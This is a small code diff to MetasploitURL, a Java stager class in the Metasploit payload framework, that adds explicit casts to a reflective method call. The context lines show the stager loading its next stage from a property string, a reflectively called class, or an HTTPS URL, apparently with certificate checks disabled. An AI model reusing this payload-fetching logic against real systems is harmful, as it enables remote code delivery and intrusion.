@@ -58,7 +58,7 @@ public class MetasploitURL extends Stager implements X509TrustManager, HostnameV
 			// for debugging: just use raw bytes from property file
 			in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
 		} else if (url.startsWith("call:")) {
-			in = (InputStream) Class.forName(url.substring(5)).getMethod("getIn", null).invoke(null, null);
+			in = (InputStream) Class.forName(url.substring(5)).getMethod("getIn", (Class[]) null).invoke(null, (Object[]) null);
 		} else if (url.startsWith("https:")) {
 			URLConnection uc = new URL(url).openConnection();
 			if (uc instanceof HttpsURLConnection) {
